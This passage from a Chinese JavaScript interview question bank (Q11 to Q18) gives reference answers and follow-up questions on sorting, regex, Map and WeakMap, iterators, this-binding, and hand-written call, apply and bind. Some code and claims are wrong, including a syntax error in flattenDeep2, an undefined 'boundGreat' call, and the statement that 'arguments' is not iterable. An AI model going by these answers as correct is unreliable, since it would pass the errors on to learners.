function flattenDeep(arr) {
  return arr.reduce((acc, val) =>
    Array.isArray(val)
      ? acc.concat(flattenDeep(val))  // 递归展平子数组
      : acc.concat(val),              // 非数组直接拼接
  []);
}

flattenDeep([1, [2, [3, [4]]]]); // [1, 2, 3, 4]
```

#### 方法三：递归 + forEach / push

```javascript
function flattenDeep2(arr) {
  const result = [];
  (function flat(list) {
    list.forEach(item => {
      Array.isArray(item) ? flat(item) : result.push(item));
    });
  })(arr);
  return result;
}
```

#### 方法四：栈（非递归，避免栈溢出）

```javascript
function flattenStack(arr) {
  const stack = [...arr];  // 浅拷贝作为栈
  const result = [];

  while (stack.length) {
    const top = stack.pop();
    if (Array.isArray(top)) {
      // 将数组元素推回栈（reverse 保持顺序）
      stack.push(...top.reverse());
    } else {
      result.push(top);
    }
  }
  return result.reverse(); // 因为是 pop 出来的，需要反转
}

// 优点：不会递归过深导致栈溢出
// 适合超深嵌套的大数组
```

#### 方法五：toString + split（Hack 方式，仅适用于纯数字数组）

```javascript
function flattenHack(arr) {
  return arr.toString().split(',').map(Number);
}
// [1,[2,3],[4,[5]]] → "1,2,3,4,5" → [1,2,3,4,5]
// ⚠️ 局限：只适用于纯数字数组，会丢失其他类型信息
```

#### 方法六：Generator 递归（惰性求值）

```javascript
function* flattenGen(arr) {
  for (const item of arr) {
    if (Array.isArray(item)) {
      yield* flattenGen(item);  // 委托给递归生成器
    } else {
      yield item;
    }
  }
}

[...flattenGen([1, [2, [3, [4]]]])]; // [1, 2, 3, 4]
// 优点：支持惰性计算，适合流式处理超大数组
```

---

## Q12: Array.prototype.sort() 方法有什么「坑」？如何正确使用自定义排序？
- **难度**：★☆☆
- **知识点**：sort、排序算法、比较函数
- **题型**：简答题 + 代码分析题

### 参考答案要点：

#### 1. 三大「坑」

**坑一：默认按字符串 Unicode 码点排序**

```javascript
[10, 2, 30].sort();
// [10, 2, 30] ❌ 不是 [2, 10, 30]！
// 因为 '10' < '2'（字符串比较：'1' < '2'）

// 数字排序必须提供比较函数
[10, 2, 30].sort((a, b) => a - b);
// [2, 10, 30] ✅
```

**坑二：原地修改原数组（mutate）**

```javascript
const original = [3, 1, 2];
const sorted = original.sort();
console.log(original); // [1, 2, 3] — 原数组被修改了！
console.log(sorted === original); // true — 返回的是同一引用

// 如果不想修改原数组，需要先拷贝
const sortedCopy = [...original].sort((a, b) => a - b);
// 或
const sortedCopy2 = original.slice().sort((a, b) => a - b);
```

**坑三：比较函数的不稳定性（V8 历史遗留）**

```javascript
// ES2019 规范要求 sort 必须是稳定排序
// 但某些旧引擎可能不稳定
const items = [
  { id: 1, score: 90 },
  { id: 2, score: 80 },
  { id: 3, score: 90 },  // 相同 score，应保持原始顺序
];
items.sort((a, b) => a.score - b.score);
// 稳定排序：id:2, id:1, id:3（相同 score 保持原序）
// 不稳定排序：id:2, id:3, id:1（顺序不确定）
```

#### 2. 比较函数的正确写法

```javascript
// 比较函数规则：
// 返回负数 → a 排在 b 前面
// 返回正数 → b 排在 a 前面
// 返回 0    → 顺序不变

// 升序排列
arr.sort((a, b) => a - b);

// 降序排列
arr.sort((a, b) => b - a);

// 多条件排序：先按 score 降序，score 相同按 id 升序
users.sort((a, b) => {
  if (b.score !== a.score) return b.score - a.score;
  return a.id - b.id;
});

// 字符串排序（中文拼音）
arr.sort((a, b) => a.localeCompare(b, 'zh-CN'));

// 字符串忽略大小写排序
arr.sort((a, b) => a.toLowerCase().localeCompare(b.toLowerCase()));

// 混合类型排序（数字在前，字符串在后）
mixedArr.sort((a, b) => {
  const typeA = typeof a, typeB = typeof b;
  if (typeA !== typeB) return typeA === 'number' ? -1 : 1;
  if (typeA === 'number') return a - b;
  return a.localeCompare(b);
});
```

#### 3. sort 的内部实现

```javascript
// V8 引擎中 sort 的实现策略：
// 数组长度 <= 10：插入排序（Insertion Sort）
// 数组长度 > 10 且元素分布均匀：快速排序（QuickSort）
// 数组长度 > 10 且元素分布不集中：TimSort（结合归并 + 插入）

// 时间复杂度：平均 O(n log n)，最坏 O(n²)（早期版本）
// 空间复杂度：O(log n) ~ O(n)
```

### 🔍 追问链

1. **不同浏览器对 sort 的实现一样吗？V8 的排序算法是什么？**
   → 方向：V8 对短数组用插入排序，长数组用 TimSort（结合归并+插入）；不是纯快速排序
2. **sort 是稳定排序还是不稳定排序？稳定排序有什么意义？**
   → 方向：V8 的 TimSort 是稳定的；稳定排序保证相等元素的相对顺序不变（如按多字段排序时重要）
3. **如何实现一个通用的多字段排序函数？**
   → 方向：接受字段名数组和方向数组，逐层比较；利用 sort 比较函数返回 -1/0/1

---

## Q13: 请列举 JavaScript 正则表达式的常见使用模式和性能优化技巧。
- **难度**：★☆☆
- **知识点**：正则表达式、RegExp
- **题型**：简答题

### 参考答案要点：

#### 1. 常见使用模式

```javascript
// ====== 校验类 ======

// 手机号（中国大陆）
const phoneReg = /^1[3-9]\d{9}$/;
phoneReg.test('13812345678'); // true

// 邮箱
const emailReg = /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/;

// 身份证号（18位）
const idCardReg = /^[1-9]\d{5}(?:19|20)\d{2}(?:0[1-9]|1[0-2])(?:0[1-9]|[12]\d|3[01])\d{3}[\dXx]$/;

// 密码强度（至少8位，含大小写字母和数字）
const pwdReg = /^(?=.*[a-z])(?=.*[A-Z])(?=.*\d)[a-zA-Z\d]{8,}$/;

// URL
const urlReg = /^https?:\/\/[^\s/$.?#].[^\s]*$/i;
// ====== 匹配提取类 ======

// 提取字符串中的数字
'价格: 100元, 折扣: 85折'.match(/\d+/g); // ['100', '85']

// 提取 HTML 标签内容
'<div class="main">Hello</div>'.match(/<[^>]+>(.*?)<\/[^>]+>/)?.[1]; // 'Hello'

// 提取查询参数
const queryStr = '?name=tom&age=18&city=beijing';
const params = {};
queryStr.replace(/[?&](\w+)=([^&]*)/g, (_, key, val) => {
  params[key] = decodeURIComponent(val);
});
// params: {name:'tom', age:'18', city:'beijing'}
// ====== 替换类 ======

// 驼峰转下划线（kebab-case）
'fontSize'.replace(/([A-Z])/g, '-$1').toLowerCase(); // 'font-size'

// 下划线转驼峰
'font-size'.replace(/-(\w)/g, (_, c) => c.toUpperCase()); // 'fontSize'

// 格式化手机号（138****5678）
'13812345678'.replace(/(\d{3})\d{4}(\d{4})/, '$1****$2');

// 千分位分隔
'12345678'.replace(/\B(?=(\d{3})+(?!\d))/g, ','); // '12,345,678'
// ====== 常用标志位 ======
// g — 全局匹配（ findAll ）
// i — 忽略大小写
// m — 多行模式（^ $ 匹配每行首尾）
// s — dotAll 模式（. 匹配包括换行在内的所有字符，ES2018）
// u — Unicode 模式（正确处理代理对等）
// y — 粘滞模式（从 lastIndex 开始匹配）
```

#### 2. 性能优化技巧

```javascript
// ====== 优化1：避免灾难性回溯（Catastrophic Backtracking）======

// ❌ 危险：嵌套量词可能导致指数级回溯
// 如 /(a+)+$/.test('aaaaaaaaaaaaaaaab') 可能耗时极长
// 原因：引擎会尝试各种可能的分组组合

// ✅ 解决：使用占有量词（JS 原生不支持）或原子分组（不支持）
// 实际替代方案：改写正则，避免嵌套量词
/a+a$/  // 比 /(a+)+$/ 好

// ====== 优化2：使用具体的字符类而非 . ======

// ❌ 慢：. 会匹配几乎所有字符，回溯空间大
/<div>(.*)<\/div>/

// ✅ 快：限定字符范围
/<div>([\s\S]*?)<\/div>/   // 非贪婪 + 明确范围
// 优化3：使用非贪婪量词 *? +? ??
// 避免过度匹配
'<div>a</div><div>b</div>'.match(/<div>.*<\/div>/);
// 匹配整个 '<div>a</div><div>b</div>'（贪婪）

'<div>a</div><div>b</div>'.match(/<div>.*?<\/div>/);
// 先匹配 '<div>a</div>'（非贪婪）
// 优化4：预编译正则（循环中使用）
// ❌ 每次循环都创建新正则
for (const str of largeArray) {
  /pattern/.test(str);  // 每次创建新 RegExp 对象
}

// ✅ 预编译一次，复用
const pattern = /pattern/;
for (const str of largeArray) {
  pattern.test(str);  // 复用同一正则对象
}
// 优化5：使用 exec 循环替代 match/g 的多次调用
const reg = /\w+/g;
let match;
while ((match = reg.exec(str)) !== null) {
  // 处理每个匹配
  // lastIndex 自动更新
}
// 优化6：使用锚定 ^ $ 减少搜索范围
/^pattern$/  // 只从头到尾匹配一次
/pattern/    // 可能从字符串任意位置开始尝试
```

---

## Q14: 请详细对比 Map 和 Object 的异同，说明各自的使用场景。
- **难度**：★☆☆
- **知识点**：Map、Object、数据结构
- **题型**：简答题

### 参考答案要点：

#### 完整对比表

| 特性 | Object | Map |
|:---|:---|:---|
| 键的类型 | **只能是 String 或 Symbol** | **任意值**（对象、函数、NaN 等） |
| 键的顺序 | **无序**（部分引擎按插入序，但不保证） | **有序**（按插入顺序迭代） |
| 遍历方式 | `for...in`、`Object.keys/values/entries` | `for...of`、`forEach`、`keys/values/entries` |
| Size 属性 | 需手动计算 `Object.keys(obj).length` | `map.size` 直接获取 |
| 序列化 | `JSON.stringify()` 原生支持 | **不支持**，需手动转换 |
| 性能（频繁增删） | 一般 | **更优**（专门为此设计） |
| 键的存在检查 | `in`（含原型链）、`hasOwnProperty` | `has()`（不含原型链） |
| 原型链 | **有**（可能有键冲突） | **无**（纯净的数据容器） |

#### 代码示例对比

```javascript
// ====== 键的类型差异 ======
const obj = {};
const map = new Map();

obj[{key: 1}] = 'value';  // 键被转为 '[object Object]'
map.set({key: 1}, 'value'); // 键保持为对象引用 ✅

map.set(function(){}, 'fn');   // 函数作键 ✅
map.set(NaN, 'nan_value');     // NaN 作键 ✅（Map 中 NaN 等于自身）
map.get(NaN);                  // 'nan_value' ✅

// ====== 迭代顺序 ======
const orderedMap = new Map();
orderedMap.set('z', 1);
orderedMap.set('a', 2);
orderedMap.set('m', 3);
[...orderedMap]; // [['z',1], ['a',2], ['m',3]] — 保持插入顺序 ✅

const orderedObj = { z:1, a:2, m:3 };
Object.entries(orderedObj); // 顺序取决于 JS 引擎实现

// ====== Size 和遍历 ======
map.size;                     // 直接获取数量
Object.keys(obj).length;      // 需要临时生成数组

// Map 遍历
map.forEach((value, key) => console.log(key, value));
for (const [key, value] of map) { /* ... */ }

// ====== 性能场景 ======
// 频繁增删键值对 → Map 更优
// 结构化数据、需要序列化 → Object 更优
```

#### 使用场景选择指南

```javascript
// ✅ 选 Object 的场景：
// 1. 需要序列化为 JSON
const config = { host: 'localhost', port: 3000 };
JSON.stringify(config);

// 2. 键已知且固定（如配置项、记录结构）
const user = { id: 1, name: 'Tom', email: 'tom@example.com' };

// 3. 需要简单的数据存储，不需要频繁增删

// ✅ 选 Map 的场景：
// 1. 键不是字符串（如对象作键、DOM 节点作键）
const nodeToData = new Map();
nodeToData.set(domNode, { clicked: 0 });

// 2. 需要保持键值对的插入顺序
const eventQueue = new Map();

// 3. 频繁地添加和删除键值对
const cache = new Map();

// 4. 需要知道 size（不需要遍历计算）
if (cache.size > MAX_CACHE_SIZE) { /* 清理 */ }

// 5. 避免原型链污染（如解析用户输入）
const safeStore = new Map(); // 无原型链，绝对安全
```

---

## Q15: WeakMap 和 WeakSet 的「弱引用」是什么意思？它们的主要使用场景有哪些？
- **难度**：★☆☆
- **知识点**：WeakMap、WeakSet、弱引用、垃圾回收
- **题型**：简答题

### 参考答案要点：

#### 1. 弱引用的概念

WeakMap 和 WeakSet 对其**键（WeakMap）/ 值（WeakSet）持有弱引用**。这意味着：

- 当键/值对象**在外部不再被强引用**时，它可以被垃圾回收器回收
- 弱引用**不会阻止 GC** 回收该对象

```javascript
// 普通 Map — 强引用，阻止 GC
const strongMap = new Map();
let obj = { name: 'Tom' };
strongMap.set(obj, 'some data');
obj = null; // 移除外部引用
// 但 { name:'Tom' } 仍存在于 strongMap 中，不会被回收！

// WeakMap — 弱引用，不阻止 GC
const weakMap = new WeakMap();
let obj2 = { name: 'Jerry' };
weakMap.set(obj2, 'some data');
obj2 = null; // 移除外部引用
// 现在 { name:'Jerry' } 可以被 GC 回收了！
// weakMap 中对应的条目会被自动清除
```

#### 2. WeakMap 的限制

```javascript
// ⚠️ WeakMap 的限制（因为弱引用语义导致的）：
// 1. 键必须是对象（不能是基本类型）
// weakMap.set('key', 'val'); // TypeError!

// 2. 不可迭代（没有 keys/values/entries/forEach/size）
// 因为不知道哪些键还存活，随时可能被 GC 清除
// weakMap.size;     // undefined
// weakMap.keys();   // TypeError

// 3. 没有 clear() 方法（部分实现已移除）
```

#### 3. WeakSet 的限制

```javascript
// WeakSet 类似 WeakMap：
// - 值必须是对象
// - 不可迭代
// - 没有 size/clear
// - 值是弱引用

const ws = new WeakSet();
ws.add({ id: 1 });  // ✅
ws.add(1);          // TypeError!
```

#### 4. 主要使用场景

##### 场景一：关联额外数据（不延长对象生命周期）

```javascript
// DOM 节点关联数据
const domData = new WeakMap();

function attachData(element, data) {
  domData.set(element, data);
}

// 当 DOM 节点被移除时，关联数据自动释放
// 不会造成内存泄漏
```

##### 场景二：缓存计算结果（自动清理过期缓存）

```javascript
const cache = new WeakMap();

function heavyCalculation(obj) {
  if (cache.has(obj)) {
    return cache.get(obj);  // 缓存命中
  }
  const result = /* 昂贵的计算 */;
  cache.set(obj, result);  // 缓存结果
  return result;
}
// 当 obj 被回收时，缓存条目也自动清除
```

##### 场景三：私有数据存储（类似 Symbol 但自动清理）

```javascript
const privateData = new WeakMap();

class Person {
  constructor(name) {
    privateData.set(this, { name, createdAt: Date.now() });
  }
  get name() { return privateData.get(this).name; }
}
```

##### 场景四：防止内存泄漏的事件监听器管理

```javascript
// Vue 3 的响应式系统内部就大量使用 WeakMap
// 存储依赖关系，当组件卸载时自动清理
```

#### 5. Map vs WeakMap 快速选择

| 场景 | 选择 |
|:---|:---|
| 需要遍历所有键值对 | Map |
| 需要知道 size | Map |
| 键可能是基本类型 | Map |
| 需要 JSON 序列化 | Map |
| **对象作键且希望自动 GC** | **WeakMap** |
| **缓存/关联数据（防泄漏）** | **WeakMap** |

---

## Q16: 什么是 Iterable（可迭代对象）和 Iterator（迭代器）协议？请解释 `for...of` 的底层工作原理。
- **难度**：★☆☆
- **知识点**：Iterator、Iterable、for...of、Symbol.iterator
- **题型**：简答题 + 编程实践题

### 参考答案要点：

#### 1. 两个协议的定义

**Iterable 协议（可迭代协议）**：对象实现了 `[Symbol.iterator]()` 方法，该方法返回一个 Iterator 对象。

**Iterator 协议（迭代器协议）**：对象有 `next()` 方法，每次调用返回 `{ value: any, done: boolean }`。

```javascript
// 一个对象要成为可迭代的，需要满足：
const myIterable = {
  [Symbol.iterator]() {
    // 返回一个迭代器对象
    let step = 0;
    return {
      next() {
        if (step < 3) {
          return { value: step++, done: false };
        }
        return { value: undefined, done: true };
      }
    };
  }
};

// 现在可以用 for...of 遍历了
for (const val of myIterable) {
  console.log(val); // 0, 1, 2
}

// 也可以用展开运算符
[...myIterable]; // [0, 1, 2]

// 解构赋值
const [a, b, c] = myIterable; // a=0, b=1, c=2
```

#### 2. for...of 底层原理

```javascript
// for...of 的底层等价实现：
const iterable = [1, 2, 3];
const iterator = iterable[Symbol.iterator](); // 获取迭代器

let result = iterator.next();
while (!result.done) {
  const value = result.value;
  console.log(value); // 循环体
  result = iterator.next(); // 下一步
}
```

#### 3. 内置的可迭代对象

```javascript
// JS 中原生支持迭代的类型：
// - Array
// - String
// - TypedArray (Uint8Array 等)
// - Map
// - Set
// - arguments（类数组，但不是可迭代的！需转换）
// - NodeList（现代浏览器）
// - Generator 对象

// 普通对象不是可迭代的！
// for (const v of {}) // TypeError: {} is not iterable
```

#### 4. 自定义迭代器的实际应用

```javascript
// 应用1：范围迭代器
function range(start, end, step = 1) {
  return {
    [Symbol.iterator]() {
      let current = start;
      return {
        next() {
          if (step > 0 ? current <= end : current >= end) {
            const value = current;
            current += step;
            return { value, done: false };
          }
          return { done: true };
        }
      };
    }
  };
}

[...range(0, 5)];   // [0, 1, 2, 3, 4, 5]
[...range(5, 0, -1)]; // [5, 4, 3, 2, 1]
for (const n of range(1, 10, 2)) {
  console.log(n); // 1, 3, 5, 7, 9
}

// 应用2：树结构的深度优先遍历迭代器
class TreeNode {
  constructor(val) {
    this.val = val;
    this.children = [];
  }
  addChild(node) { this.children.push(node); }

  *[Symbol.iterator]() {  // Generator 简化迭代器实现
    yield this.val;
    for (const child of this.children) {
      yield* child;  // 委托给子节点的迭代器
    }
  }
}

const root = new TreeNode(1);
root.addChild(new TreeNode(2));
root.addChild(new TreeNode(3));
root.children[0].addChild(new TreeNode(4));

[...root]; // [1, 2, 4, 3]
```

#### 5. 迭代器的高级用法

```javascript
// 提前终止迭代器（return 方法）
function createIterator() {
  let count = 0;
  return {
    [Symbol.iterator]() { return this; },
    next() {
      return { value: ++count, done: count > 5 };
    },
    return(reason) {
      console.log('迭代器提前终止:', reason);
      return { done: true }; // 清理资源
    }
  };
}

const iter = createIterator();
for (const v of iter) {
  if (v === 3) break; // 触发 return() 方法
}
// 输出：迭代器提前终止: undefined

// throw 方法（用于 Generator 中配合 throw 让外部向迭代器内部抛出异常）
```

---

# 二、进阶层 ★★☆（Q17 - Q39）

---

## Q17: 请详细说明 JavaScript 中 `this` 的 4 种绑定规则，以及箭头函数对 this 的特殊处理。
- **难度**：★★☆
- **知识点**：this 绑定、箭头函数
- **题型**：简答题 + 代码分析题

### 参考答案要点：

#### 1. this 的 4 种绑定规则（优先级从高到低）

**规则一：new 绑定（最高优先级）**

```javascript
function Person(name) {
  this.name = name; // this 指向新创建的对象
}
const p = new Person('Tom');
p.name; // 'Tom'
```

**规则二：显式绑定（call / apply / bind）**

```javascript
function greet(greeting) {
  return `${greeting}, I'm ${this.name}`;
}

const person = { name: 'Tom' };

greet.call(person, 'Hello');   // 'Hello, I'm Tom'
greet.apply(person, ['Hi']);  // 'Hi, I'm Tom'
const boundFn = greet.bind(person);
boundFn('Hey');               // 'Hey, I'm Tom'
```

**规则三：隐式绑定（通过对象调用）**

```javascript
const user = {
  name: 'Alice',
  sayName() {
    return this.name; // this 指向调用 sayName 的对象
  }
};
user.sayName(); // 'Alice' — 通过 user 调用

const fn = user.sayName;
fn(); // undefined — fn 独立调用，this 指向全局（严格模式下为 undefined）
// 这就是「this 丢失」问题
```

**规则四：默认绑定（最低优先级）**

```javascript
// 独立函数调用
function show() {
  console.log(this);
}
show(); // window（非严格模式）/ undefined（严格模式）

// 严格模式下
'use strict';
show(); // undefined
```

#### 2. 优先级总结

```
new 绑定 > 显式绑定（call/apply/bind） > 隐式绑定（obj.fn()） > 默认绑定
```

#### 3. 箭头函数的 this 特性

```javascript
// 箭头函数**没有自己的 this**
// 它的 this 从定义时的外层作用域继承（词法 this）

const obj = {
  name: 'Bob',
  regularFn() {
    console.log(this.name); // 'Bob' — this 由调用决定
  },
  arrowFn: () => {
    console.log(this.name); // undefined — this 继承自外层（全局）
  }
};

obj.regularFn(); // 'Bob'
obj.arrowFn();   // undefined（外层是全局作用域）

// 箭头函数的正确使用场景
const obj2 = {
  name: 'Carol',
  init() {
    // 箭头函数继承了 init 的 this（即 obj2）
    document.addEventListener('click', () => {
      console.log(this.name); // 'Carol' ✅
    });

    // 对比：普通函数的 this 会指向触发事件的元素
    document.addEventListener('click', function() {
      console.log(this.name); // undefined ❌（this 是 DOM 元素）
    });
  }
};
obj2.init();
```

#### 4. 箭头函数的限制

```javascript
// 1. 不能用作构造函数
const Fn = () => {};
// new Fn(); // TypeError: Fn is not a constructor

// 2. 没有 prototype 属性
Fn.prototype; // undefined

// 3. 没有 arguments 对象
const arrow = () => console.log(arguments); // ReferenceError
// 使用 rest 参数代替
const arrow2 = (...args) => console.log(args);

// 4. 不能用 call/apply/bind 改变 this
const arrow3 = () => this;
arrow3.call({ name: 'test' }); // this 仍然是外层的 this，不会改变
```

#### 5. 经典 this 面试题

```javascript
// 题目：以下输出什么？
var name = 'window';
const obj = {
  name: 'obj',
  getName: function() {
    return function() {
      return this.name;
    };
  }
};

console.log(obj.getName()()); // 'window'
// 分析：obj.getName() 返回了一个匿名函数
// 该匿名函数独立调用（不是通过 obj 调用），所以 this 指向全局

// 改造为箭头函数：
const obj2 = {
  name: 'obj2',
  getName: function() {
    return () => this.name;  // 箭头函数继承外层 this
  }
};
console.log(obj2.getName()()); // 'obj2'
// 箭头函数的 this 继承自 getName 方法中的 this（即 obj2）
```

### 🔍 追问链

1. **箭头函数的 this 是怎么确定的？能通过 call 改变吗？**
   → 方向：箭头函数没有自己的 this，它从定义时的外层词法环境继承 this；call/apply/bind 无法改变
2. **严格模式和非严格模式下 this 默认绑定有什么区别？**
   → 方向：非严格模式下独立函数调用 this → window；严格模式下 this → undefined
3. **React 类组件中的事件处理为什么要 bind(this)？有哪些替代方案？**
   → 方向：类方法不自动绑定 this；替代方案：箭头函数定义方法、构造函数中 bind、实验性语法 class properties

---

## Q18: 请详细说明 `call`、`apply`、`bind` 三者的区别，并手写实现 `bind`。
- **难度**：★★☆
- **知识点**：call、apply、bind、手写实现
- **题型**：简答题 + 编程实践题

### 参考答案要点：

#### 1. 三者区别

| 特性 | call | apply | bind |
|:---|:---:|:---:|:---:|
| 调用方式 | **立即执行** | **立即执行** | **返回新函数**（不立即执行） |
| 参数传递 | 逐个传参 `(ctx, arg1, arg2)` | 数组传参 `(ctx, [arg1, arg2])` | 逐个传参 `(ctx, arg1, arg2)` |
| 返回值 | 函数执行结果 | 函数执行结果 | **新函数** |
|柯里化 | 不支持 | 不支持 | **支持**（可预设参数） |
| new 调用 | 不适用 | 不适用 | **支持**（bind 后的函数可用 new） |

```javascript
function greet(greeting, punctuation) {
  return `${greeting}, ${this.name}${punctuation}`;
}
const person = { name: 'Tom' };

// call — 立即执行，逐个传参
greet.call(person, 'Hello', '!');  // 'Hello, Tom!'

// apply — 立即执行，数组传参
greet.apply(person, ['Hi', '~']);  // 'Hi, Tom~'

// bind — 返回新函数，可后续调用
const boundGreet = greet.bind(person, 'Hey');
boundGreet('!');   // 'Hey, Tom!'
boundGreat('??');  // 'Hey, Tom??'

// bind 的柯里化能力
const sayHello = greet.bind(person, 'Hello');
sayHello('!');  // 'Hello, Tom!'
sayHello('.');  // 'Hello, Tom.'
```

#### 2. 手写 call

```javascript
Function.prototype.myCall = function(ctx, ...args) {
  // ctx 为 null/undefined 时指向全局对象
  ctx = ctx ?? globalThis;

  // 使用 Symbol 避免属性名冲突
  const fnKey = Symbol('fn');
  ctx[fnKey] = this;  // this 就是要调用的函数

  const result = ctx[fnKey](...args);  // 通过 ctx 调用，this 自然指向 ctx

  delete ctx[fnKey];  // 清理临时属性
  return result;
};
```

#### 3. 手写 apply

```javascript
Function.prototype.myApply = function(ctx, argsArray) {
  ctx = ctx ?? globalThis;
  const fnKey = Symbol('fn');
  ctx[fnKey] = this;
  const result = ctx[fnKey](...(argsArray ?? []));  // argsArray 可能是 null/undefined
  delete ctx[fnKey];
  return result;
};
```

#### 4. 手写 bind（核心考点）

```javascript
Function.prototype.myBind = function(ctx, ...presetArgs) {
  // 保存原始函数
  const originalFn = this;

  // 返回一个新函数
  function boundFn(...laterArgs) {
    // 合并预设参数和后续传入的参数
    const allArgs = [...presetArgs, ...laterArgs];

    // 关键判断：如果被 new 调用，this 应该是新创建的实例
    // 而不是绑定的 ctx
    if (new.target) {
      // new 调用时，忽略绑定的 ctx 和 presetArgs 中的 this
      return new originalFn(...allArgs);
    }

    // 普通 call 调用
    return originalFn.apply(ctx, allArgs);
  }

  // 维护原型链：让 boundFn.prototype 指向原函数的 prototype
  // 这样 boundFn 创建的实例能继承原函数原型上的方法
  // 使用 Object.create 避免直接引用（防止修改相互影响）
  boundFn.prototype = Object.create(originalFn.prototype);

  return boundFn;
};

// 测试
function Person(name, age) {
  this.name = name;
  this.age = age;
}
Person.prototype.sayHi = function() {
  return `Hi, I'm ${this.name}`;
};

const BoundPerson = Person.bind(null, 'Default');
const p = new BoundPerson(25);
console.log(p.name);   // 'Default'（bind 预设了第一个参数）
console.log(p.age);    // 25
console.log(p.sayHi()); // 'Hi, I'm Default'（原型链正常）
```

#### 5. bind 的边界情况

```javascript
// 1. bind 多次调用
function f() { return this.x; }
const f1 = f.bind({ x: 1 });
const f2 = f1.bind({ x: 2 });  // 第二次 bind 无效！
f2(); // 1（仍然是第一次 bind 的值）

// 2. bind 配合 new
function Greeting(name) {
  this.name = name;
}
const BoundGreeting = Greeting.bind({}, 'Bound');
const g = new BoundGreeting('NewCall');
// g.name = 'NewCall' — new 的优先级高于 bind
```

### 深度拓展：手写实现

#### 手写 myCall - 完整版实现

```javascript
/**
 * 手写 Function.prototype.call - 完整版
 * @param {*} thisArg - this 指向的目标对象（null/undefined 时指向全局对象）
 * @param {...any} args - 传递给函数的参数列表（逐个传入）
 * @returns {any} 函数执行的返回值
 * 
 * 核心原理：通过将函数作为对象的属性调用，让函数内部的 this 自然指向该对象
 */
Function.prototype.myCall = function(thisArg, ...args) {
  // ==================== 步骤1：处理 thisArg（上下文对象）====================
  
  // 如果 thisArg 是 null 或 undefined，在非严格模式下指向全局对象（window/globalThis）
  // 在严格模式下保持 null/undefined（但为了模拟原生行为，我们统一处理为全局对象）
  // 原生 call 的行为：call(null) 等价于在非严格模式下不传 thisArg
  
  const ctx = (thisArg === null || thisArg === undefined) 
    ? globalThis  // 全局对象（浏览器是 window，Node.js 是 global）
    : Object(thisArg);  // 将原始值包装为对象（如 123 → Number(123), 'str' → String('str')）

  // ==================== 步骤2：使用 Symbol 避免属性名冲突 ====================
  
  // 为什么用 Symbol？
  // 因为直接使用字符串属性名（如 'fn'）可能与对象已有属性冲突
  // 例如：如果 ctx 本身就有 fn 属性，就会覆盖原有值！
  // Symbol 保证唯一性，不会与任何现有属性冲突
  
  const fnKey = Symbol('myCall');  // 创建唯一的 Symbol 作为临时属性名

  // ==================== 步骤3：将函数挂载到上下文对象上 ====================
  
  // 关键技巧：this 指向调用 myCall 的函数（即我们要执行的那个函数）
  // 例如：fn.myCall(obj) → this 就是 fn
  // 将 fn 赋值给 ctx[fnKey]，这样调用 ctx[fnKey]() 时，fn 内部的 this 就是 ctx
  
  ctx[fnKey] = this;  // this 就是要调用的原始函数

  // ==================== 步骤4：执行函数并获取返回值 ====================
  
  let result;
  
  try {
    // 通过 ctx.fnKey(...) 调用函数
    // 此时函数内部的 this 指向 ctx ✅
    // 使用展开运算符 ...args 将参数逐个传入
    result = ctx[fnKey](...args);
  } catch (error) {
    // 如果函数执行抛出异常，需要清理后再重新抛出
    delete ctx[fnKey];  // 确保清理临时属性
    throw error;        // 重新抛出异常（保持原有的错误堆栈信息）
  }

  // ==================== 步骤5：清理临时属性 ====================
  
  // 必须删除临时添加的属性，避免"污染"原对象
  // 这就是为什么 call/apply 是"一次性"的操作，不会留下副作用
  
  delete ctx[fnKey];

  // ==================== 步骤6：返回结果 ====================
  return result;
};

// ==================== 测试用例 ====================

// 测试1：基本用法
function greet(greeting, punctuation) {
  return `${greeting}, ${this.name}${punctuation}`;
}

const person = { name: 'Tom' };

console.log(greet.myCall(person, 'Hello', '!'));   // "Hello, Tom!" ✅
console.log(greet.myCall(person, 'Hi', '~'));      // "Hi, Tom~" ✅

// 测试2：thisArg 为 null/undefined（指向全局对象）
function showGlobal() {
  return this === globalThis;  // 检查是否指向全局对象
}

console.log(showGlobal.myCall(null));     // true ✅（非严格模式）
console.log(showGlobal.myCall(undefined)); // true ✅

// 测试3：原始值包装（自动装箱）
function getNumberType() {
  return typeof this;  // this 应该被包装为 Number 对象
}

console.log(getNumberType.myCall(123));    // "object" ✅（Number 对象）
console.log(getNumberType.myCall('abc'));  // "object" ✅（String 对象）

// 测试4：Symbol 属性不会冲突
const objWithFn = {
  name: 'conflict',
  fn: function() { return 'original fn'; }  // 对象本身有 fn 属性
};

console.log(greet.myCall(objWithFn, 'Hey', '?'));  // "Hey, conflict?" ✅
console.log(objWithFn.fn());                        // "original fn" ✅（没有被覆盖）
```

#### 手写 myApply - 完整版实现

```javascript
/**
 * 手写 Function.prototype.apply - 完整版
 * @param {*} thisArg - this 指向的目标对象
 * @param {Array|any} argsArray - 参数数组（或类数组对象）
 * @returns {any} 函数执行的返回值
 * 
 * 与 myCall 的区别：参数以数组形式传入，而不是逐个传入
 */
Function.prototype.myApply = function(thisArg, argsArray) {
  // ==================== 步骤1：处理 thisArg（与 myCall 相同）====================
  const ctx = (thisArg === null || thisArg === undefined)
    ? globalThis
    : Object(thisArg);

  // ==================== 步骤2：处理参数数组（关键差异点）====================
  
  // apply 接收的第二个参数必须是数组或类数组对象
  // 特殊情况处理：
  // - 未提供参数 / 参数为 undefined/null → 当作空数组 []
  // - 不是数组/类数组 → 抛出 TypeError（与原生行为一致）
  
  let args = [];
  
  if (argsArray !== undefined && argsArray !== null) {
    // 验证 argsArray 是否为数组或类数组对象
    // 类数组对象：有 length 属性且是非负整数
    
    if (typeof argsArray !== 'object') {
      // 原始类型（数字、字符串等）不是合法的参数列表
      throw new TypeError(
        `CreateListFromArrayLike called on non-object when trying to spread ${typeof argsArray}`
      );
    }
    
    // 检查是否有 length 属性（类数组的标志）
    if (argsArray.length === undefined && !Array.isArray(argsArray)) {
      throw new TypeError(
        'Second argument to Function.prototype.apply must be an array-like object'
      );
    }
    
    // 将类数组转换为真正的数组
    // 使用 Array.from 可以处理：
    // - 真正的数组 [1, 2, 3]
    // - arguments 对象
    // - NodeList、HTMLCollection 等 DOM 集合
    // - 有 length 和索引的对象 {0: 'a', 1: 'b', length: 2}
    args = Array.from(argsArray);
  }
  // else: argsArray 是 undefined/null → 使用空数组 []

  // ==================== 步骤3-6：与 myCall 相同的逻辑 ====================
  const fnKey = Symbol('myApply');
  ctx[fnKey] = this;

  let result;
  try {
    result = ctx[fnKey](...args);  // 使用展开运算符传入参数数组
  } catch (error) {
    delete ctx[fnKey];
    throw error;
  }

  delete ctx[fnKey];
